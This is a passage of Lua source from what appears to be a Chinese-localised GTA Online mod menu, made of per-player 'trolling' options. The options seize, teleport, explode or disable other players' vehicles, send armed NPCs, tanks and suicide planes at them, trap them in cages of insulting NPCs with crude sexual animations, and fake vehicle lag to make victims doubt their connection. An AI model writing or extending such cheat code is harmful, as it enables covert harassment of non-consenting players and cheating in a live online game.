                ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                break 
            case 2: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(car, player_cur_car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break
            case 3: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(player_cur_car, car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break
            case 4: 
                ENTITY.DETACH_ENTITY(car, false, false)
                if player_cur_car ~= 0 then
                    ENTITY.DETACH_ENTITY(player_cur_car, false, false)
                end
                ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
                break
            end
        end
    end)
    GTAC(player_veh_teleport, "传送载具到我", {"tpvtome"}, "如果这不起作用，它不是一个bug", function(on_click)
        tpcartome(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到导航点", {"tpvtoway"}, "如果这不起作用，它不是一个bug", function(on_click)
        tocartopoint(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到花园银行停机坪", {"tpvtomaze"}, "如果这不起作用，它不是一个bug", function(on_click)
        tptomaze(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到深海底", {"tpvunderwater"}, "如果这不起作用，它不是一个bug", function(on_click)
        tptounderwater(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到高空", {""}, "", function()
        tptohighair(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到洛圣都改车王", {"tpvlsc"}, "如果这不起作用，它不是一个bug", function(on_click)
        tolsc(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到监狱SCP-173单元", {"tpvscp"}, "如果这不起作用，它不是一个bug", function(on_click)
        tpscp(pid)
    end)
    GTAC(player_veh_teleport, "传送载具到大牢房中", {"tpvcell"}, "如果这不起作用，它不是一个bug", function(on_click)
        tocell(pid)
    end)
    local trolly_Vehicles = GT(playerOtherTrolling, "恶搞载具", {}, "")
	GTACR(trolly_Vehicles, "发送恶搞载具", {}, "", {"Bandito", "Go-Kart"}, function (index, opt)
		send_veh_attack(opt, index, pid)
	end)
	GTTG(trolly_Vehicles, "无敌的", {}, "",function(toggle) 
        send_veh_attack_god(toggle)
    end)
	GTAC(trolly_Vehicles, "派武装匪徒", {}, "", function()
        send_veh_attacker(pid)
	end)
	GTluaScript.textslider(trolly_Vehicles, "匪徒武器", {}, "", {util.get_label_text("BAND_BOMB"), util.get_label_text("TOP_MINE")}, function (index, value)
        send_veh_attacker_weapon(index, value)
	end)
	mineSlider = GTluaScript.textslider(trolly_Vehicles, "地雷", {}, "", {util.get_label_text("KINET_MINE"), util.get_label_text("EMP_MINE")}, function (index, value)
		send_veh_attacker_weapon_mine(index, value)
	end)
	GTluaScript.slider(trolly_Vehicles, "数量", {}, "", 1, 10, 1, 1, function(value)
        send_veh_attacker_number(value)
    end)
	GTAC(trolly_Vehicles, "删除", {}, "", function()
        dele_all_veh_attacker()
	end)
	GTluaScript.set_visible(mineSlider, false)
    local enemyVehiclesOpt = GT(playerOtherTrolling, "敌对载具", {}, "")
	GTACR(enemyVehiclesOpt, "派遣敌对载具", {}, "", {"Minitank", "Buzzard", "Lazer"}, function(index, option)
        veh_attacker_spawn(pid, index, option)
	end)
	GTluaScript.textslider(enemyVehiclesOpt, "迷你坦克武器", {}, "", {util.get_label_text("WT_V_PLRBUL"),util.get_label_text("MINITANK_WEAP2"),util.get_label_text("MINITANK_WEAP3"),}, function(index)
        mintank_weapon(index)
	end)
	GTluaScript.textslider(enemyVehiclesOpt, "枪手的武器", {}, "", {util.get_label_text("WT_MG"), util.get_label_text("WT_RPG")}, function(index)
		gunner_weapon(index)
	end)
	GTluaScript.slider(enemyVehiclesOpt, "数量", {}, "",1, 10, 1, 1, function (value)
        veh_attacker_spawn_count(value)
    end)
	GTTG(enemyVehiclesOpt, "无敌", {}, "",function(toggle)
        veh_attacker_spawn_god(toggle) 
    end)
	GTAC(enemyVehiclesOpt, "删除", {}, "", function()
        dele_veh_attacker()
	end)
    local cplaym = GT(playerMain, '载具攻击', {}, '')
    local vehaloop =  GTLP(cplaym, '载具攻击', {'SmashPla'},'使玩家无法站起来', function ()
        vehpushandhit(pid)
     end)
     GTluaScript.set_value(vehaloop, nil)
     GTTG(cplaym, '隐形载具', {}, '将攻击载具更改为不可见', function (on)
        vehhitcantsee(on)
     end)
     local cclist = GT(cplaym, '更改为用于载具攻击的载具', {}, '')
     GTLuaScript.list_action(cclist, '载具列表', {''}, '更改为用于载具攻击的载具', Vehlist, function(vehsel)
        vehaset.vehasel = util.joaat(Vehha[vehsel])
     end)
     GTluaScript.slider(cplaym, '攻击频率', {'assaultrate'}, '调整载具攻击频率', 100, 4000, 1000, 100, function (ar)
         vehaset.vehra = ar
      end)
     GTluaScript.text_input(cclist, '输入自定义载具模型名', {'cussmash'}, '输入车辆模型名以更改载具为攻击载具', function(cussma)
        if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cussma)) then
            vehaset.vehasel = util.joaat(cussma)
         else
            if set.alert then
                gtoast('载具名称不正确(请检查你的拼写)')
            end
         end
 end, 'toreador')
     local radio = GT(playerMain, "广播电台", {}, "")
    local stations = {}
    for station, name in pairs(station_name) do
        stations[#stations + 1] = station
    end
    GTLuaScript.list_action(radio, "更换广播电台", {}, "", stations, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(players.user())
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
        if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then
            gtoast("玩家不在载具中. :/")
        return end
        local radio_name = station_name[value]
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then 
            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                gtoast("未能成功更换玩家电台. :/")
            return end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
            if not PED.IS_PED_IN_VEHICLE(players.user_ped(), player_veh, false) then
                ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false)
                menu.trigger_commands("tpveh" .. players.get_name(pid))
                wait(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
                wait(750)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
            else
                wait(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
            end
        end
    end)
	GTLP(playerOtherTrolling,"草所有的汽车", {"fuckupallcars"}, "逐渐损坏/压垮该玩家附近的载具", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)
    	GTLP(playerOtherTrolling,"鸣笛所有汽车", {"honkallcars"}, "令附近所有车辆都按下喇叭", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)
	GTLP(playerOtherTrolling,"炸毁所有汽车", {"Blow up all cars"}, "炸飞附近所有车辆", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)
    veh_boost = GT(playerOtherTrolling, "载具加速")
	GTAC(veh_boost,"加速", {"giveboost"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100) 
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(veh_boost,"疯狂加速", {"Addictboosts"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(veh_boost,"龟速", {"trashaccs"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647) 
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"东", {"eastveh"}, "Boosts player's vehicle in the East direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 10000, 0, 0, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"西", {"westveh"}, "Boosts player's vehicle in the West direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, -10000, 0, 0, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"南", {"southveh"}, "Boosts player's vehicle in the South direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -10000, 0, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"北", {"northveh"}, "Boosts player's vehicle in the North direction",function()
        local vehicle = get_player_veh(pid,true)
        if vehicle then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 10000, 0, true, false, true)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    GTLP(veh_boost,"向上弹跳", {"bounceup"}, "Shoots player up",function()
        local vehicle = get_player_veh(pid,true)
        if vehicle then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 5, true, false, true)
        end
        wait(1000)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"向前冲击", {"launchup"}, "Shoots player up",function()
        local vehicle = get_player_veh(pid,true)
        if vehicle then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    GTAC(veh_boost,"向下沉淀", {"launchdown"}, "Shoots player down",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    GTLP(veh_boost,"分解车辆", {"explodeveh"}, "",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
            wait(1000)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"使车辆可行驶", {"engineon"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	GTAC(veh_boost,"使车辆不可行驶", {"engineoff"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    GTACR(playerOtherTrolling, "神风敢死队", {}, "召唤天煞对该玩家进行自杀式袭击", {"Lazer", "Mammatus",  "Cuban800"}, function (index, plane)
        planedied(pid, index, plane)
    end)
    GTLP(playerOtherTrolling, "敌对交通", {}, "使玩家周围的NPC载具撞击该玩家", function()
        nearcarkill(pid)
    end)
    GTLP(playerOtherTrolling, "伪造载具延迟", {"vehfakelag"}, "#针对载具内的玩家\n#模拟玩家卡顿现象\n#令该玩家怀疑自己的网络", function ()
        FakeLagPlayerVehicle(pid)
    end)
    GTTG(playerOtherTrolling, "隐形载具", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            if on then
                ENTITY.SET_ENTITY_ALPHA(car, 255)
                ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
            else
                ENTITY.SET_ENTITY_ALPHA(car, 0)
                ENTITY.SET_ENTITY_VISIBLE(car, true, 0)
            end
        end
    end)
    GTAC(playerOtherTrolling, "将载具调头", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y'], rot['z']+180, 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)
    GTAC(playerOtherTrolling, "翻转车辆", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y']+180, rot['z'], 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)
    GTAC(playerOtherTrolling, "关掉引擎", {""}, "", function()
        local vehicle = get_player_veh(pid,true)
        if vehicle then
            VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
        end
    end)
    GTAC(playerOtherTrolling, "删除载具", {}, "删除此玩家正在驾驶的载具", function()
        deleplayercar(pid)
    end)
    GTAC(playerOtherTrolling, "踢出载具", {}, "", function(toggled)
        kickcar(pid)
    end)
	GTAC(playerOtherTrolling, "变成小恐龙", {""}, "对该玩家载具伪造恐龙模型", function(on_click)
        changemodel(pid)
    end)
	GTAC(playerOtherTrolling, "传送载具到我", {""}, "", function(on_click)
        tpcartomv2(ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
    end)
    GTAC(playerOtherTrolling, "生成墙壁", {}, "在玩家面前放置墙壁,半秒后删除", function ()
        qfmq(pid)
    end)
    GTLP(playerOtherTrolling, "快乐的小陀螺", {"beybladev"}, "", function(on)
        carspin(pid)
    end)
    local npctrolls_root = GT(playerMain, "NPC恶搞", {""}, "")
    GTAC(npctrolls_root, "喵喵炸弹", {"meow"}, "UWU", function(on_click)
        meowbmob(pid)
    end)
    GTAC(npctrolls_root, "召唤马里亚奇乐队", {"mariachiband"}, "召唤一支乐队在玩家附近演奏", function(click_type)
        dispatch_mariachi(pid)
    end)
    GTAC(npctrolls_root, "召唤偷车贼v3.0", {"npcjack"}, "派一个NPC强制窃取玩家载具", function(on_click)
        npc_jack(pid, false)
    end)
    GTLuaScript.list_action(npctrolls_root, "派一个自定义的妓女来", {"customhooker"}, "发送一个可实际使用的自定义妓女", custom_hooker_options, function(index, value, click_type)
        sendsexgirl(pid, index, value)
    end)
    GTLuaScript.list_action(npctrolls_root, "绑架玩家", {"kidnap"}, "将玩家困在NPC的载具中并带走!", kidnap_types, function(index, value)
        kidnapplayer(pid, index,value)
    end)
    GTAC(npctrolls_root, "通知附近的警察逮捕他", {"arrest"}, "告诉附近的警察逮捕该玩家", function(on_click)
        tellpolicetocatch(pid)
    end)
    GTLuaScript.list_action(npctrolls_root, "在车里装满行人", {"fillcar"}, "用附近的行人填充玩家的车", fill_with_options, function(index, value, click_type)
        npcfillthecar(pid, index,value)
    end)
	GTAC(npctrolls_root, "苦力怕小丑", {"creeper"}, "生成一个自曝小丑跑向玩家并自爆!", function()
		creep(pid)
	end, nil, nil, COMMANDPERM_RUDE)
	GTLP(npctrolls_root, "派遣劫匪", {}, "", function()
        --sendmugger_npc(pid)
        if on_toggle then
        menu.trigger_commands("mugloop".. PLAYER.GET_PLAYER_NAME(pid))
        else
        menu.trigger_commands("mugloop".. PLAYER.GET_PLAYER_NAME(pid))
        end
	end)
lz = GT(playerMain, "笼子恶搞", {""}, "") 
function Pedspawn(pedhash, tar1)
    Streament(pedhash)
    local pedS = entities.create_ped(1, pedhash, tar1, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pedS, true)
    ENTITY.FREEZE_ENTITY_POSITION(pedS, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pedS, true)
    PED.SET_PED_CAN_LOSE_PROPS_ON_DAMAGE(pedS, 0,0)
    if pedhash == util.joaat('ig_lestercrest') then
        PED.SET_PED_PROP_INDEX(pedS, 1)
    end
    return pedS
end
local wall = {invis = false}
local set = {alert = true}
cage_table = {}
local pedset = {mdl = 'u_m_m_jesus_01'}
local pedca =  GTLP(lz, 'Ped笼子', {'PCAGE'}, '将玩家困在Ped笼子里', function ()
local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
local pname = PLAYER.GET_PLAYER_NAME(pid)
if not cage_table[pid] then
    local peds = {}
    local pedhash = util.joaat(pedset.mdl)
    local spec = GTluaScript.get_value(GTluaScript.ref_by_rel_path(GTluaScript.player_root(pid), "Spectate>Nuts Method"))
    Delcar(targets, spec, pid)
    local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
    for _, spawned_ped in ipairs(ped_tab) do
        spawned_ped = Pedspawn(pedhash, tar1)
        table.insert(peds,  spawned_ped)
    end
SetPedCoor(peds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(peds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(peds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(peds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(peds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)
if wall.invis then
    for index, ent in ipairs(peds) do
        ENTITY.SET_ENTITY_VISIBLE(ent, false, 0)
    end
end
if pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(peds[1], peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8])
elseif pedhash == util.joaat('player_two') then
    Trevortime(peds)
elseif pedhash == util.joaat('u_m_m_jesus_01') then
    Jesuslovesyou(peds)  
elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
if AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_FUCK_YOU') ==true
then Fuckyou(peds)
elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Provoke_Trespass')
then Provoke(peds)
elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Generic_Insult_High')
then Insulthigh(peds)
elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_WAR_CRY')
then Warcry(peds)
else
end
end
      -----------Anim-------------------------
    Streamanim('rcmpaparazzo_2')
    Streamanim('mp_player_int_upperfinger')
    Streamanim('misscarsteal2peeing')
    Streamanim('mp_player_int_upperpeace_sign')
    local ped_anim = {peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8]}
    for _, Pedanim in ipairs(ped_anim) do
        if pedhash == util.joaat('player_two') then
            Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
           local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
            Streamptfx('core')
           GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false)
        elseif pedhash == util.joaat('u_m_m_jesus_01') then
            Runanim(peds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
            Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
        else
            Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
            Runanim(peds[1], 'rcmpaparazzo_2', 'shag_loop_a')
        end
end
for _, Pedm in ipairs(peds) do
    PFP(Pedm, targets)
end
cage_table[pid] = peds
end
while cage_table[pid] do
IPM(targets, tar1, pname, cage_table, pid)
end
if not players.exists(pid) then
    if set.alert then
        gtoast('你正在让他们怒不可遏')
    end
    util.stop_thread()
    cage_table[pid] = nil
    end
end)
local PedClist = GT(lz, '选择Ped笼子', {}, '更换Ped笼子样式')
GTAC(lz, '解除Ped笼', {'FreePedcage'}, '释放该玩家', function ()
    if cage_table[pid] then
        DelEnt(cage_table[pid])
        menu.set_value(pedca, false)
        cage_table[pid] = false
        else
             if set.alert then
                gtoast('未找到Ped笼子')
             end
    end
end)
pcages = {}
rcage_table = {}
CombineTables(AMC, AfC, CSP, GM, Mpp, MSF, MCM, SMC, Ssf, Ssm, Dlcp, pcages)
local rpedca =  GTLP(lz, '随机Ped笼', {'RAMDOMPCAGE'}, '将玩家困在一个随机的Ped笼子里', function ()
  local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
  local pname = PLAYER.GET_PLAYER_NAME(pid)
  if not rcage_table[pid] then
      local rpeds = {}
      local rpedind = math.random(1, #pcages)
      local rpedset = pcages[rpedind]
      local pedhash = util.joaat(rpedset)
      local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
      Delcar(targets, spec, pid)
      local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
    for _, spawned_ped in ipairs(ped_tab) do
        spawned_ped = Pedspawn(pedhash, tar1)
        table.insert(rpeds,  spawned_ped)
    end
    SetPedCoor(rpeds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(rpeds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(rpeds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)
    if wall.invis then
        for index, ent in ipairs(rpeds) do
            ENTITY.SET_ENTITY_VISIBLE(ent, false, 0)
        end
    end
  if pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(rpeds[1], rpeds[2], rpeds[3], rpeds[4], rpeds[5], rpeds[6], rpeds[7], rpeds[8])
  elseif pedhash == util.joaat('player_two') then
      Trevortime(rpeds)
  elseif pedhash == util.joaat('u_m_m_jesus_01') then
      Jesuslovesyou(rpeds)  
  elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
  if AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'GENERIC_FUCK_YOU') ==true
  then Fuckyou(rpeds)
  elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'Provoke_Trespass')
  then Provoke(rpeds)
  elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'Generic_Insult_High')
  then Insulthigh(rpeds)
  elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'GENERIC_WAR_CRY')
  then Warcry(rpeds)
  else
  end
  end
        -----------Anim-------------------------
      Streamanim('rcmpaparazzo_2')
      Streamanim('mp_player_int_upperfinger')
      Streamanim('misscarsteal2peeing')
      Streamanim('mp_player_int_upperpeace_sign')
      local ped_anim = {rpeds[2], rpeds[3], rpeds[4], rpeds[5], rpeds[6], rpeds[7], rpeds[8]}
      for _, Pedanim in ipairs(ped_anim) do
          if pedhash == util.joaat('player_two') then
              Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
             local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
              Streamptfx('core')
             --credits to saltyscript for gfx part
             GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false)
          elseif pedhash == util.joaat('u_m_m_jesus_01') then
              Runanim(rpeds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
              Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
          else
              Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
              Runanim(rpeds[1], 'rcmpaparazzo_2', 'shag_loop_a')
          end
  end
  for _, Pedm in ipairs(rpeds) do
      PFP(Pedm, targets)
  end
  rcage_table[pid] = rpeds
  end
 while rcage_table[pid] do
  IPM(targets, tar1, pname, rcage_table, pid)
 end
  if not players.exists(pid) then
    if set.alert then
        gtoast('你正在让他们怒不可遏')
    end
    util.stop_thread()
    rcage_table[pid] = nil
    end
end)
GTAC(lz, '解除随机Ped笼', {'FreeRPedcage'}, '释放该玩家', function ()
      if rcage_table[pid] then
          DelEnt(rcage_table[pid])
          menu.set_value(rpedca, false)
          rcage_table[pid] = false
          else
               if set.alert then
                  gtoast('未找到Ped笼子')
               end
      end
  end)
  obj_table = {}
  local objset = {mdl = 'prop_mineshaft_door'}
  local objca = GTLP(lz, '物体笼子', {'ObjCage'}, '将玩家困在物体笼子里', function ()
  local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
  local pname = PLAYER.GET_PLAYER_NAME(pid)
  if not obj_table[pid] then
      local objs = {}
      local spec = GTluaScript.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
      Delcar(targets, spec, pid)
local hsel = util.joaat(objset.mdl)
      Streament(hsel)
      local obj_tab = {'o1', 'o2', 'o3', 'o4', 'o5', 'o6', 'o7', 'o8'}
      for _, spawned_obj in ipairs(obj_tab) do
          spawned_obj =  ObjFrezSpawn(hsel, tar1)
          table.insert(objs,  spawned_obj)
      end
      obj_table[pid] = objs
      SetObjCo(objs[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
      SetObjCo(objs[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
      SetObjCo(objs[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
      SetObjCo(objs[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
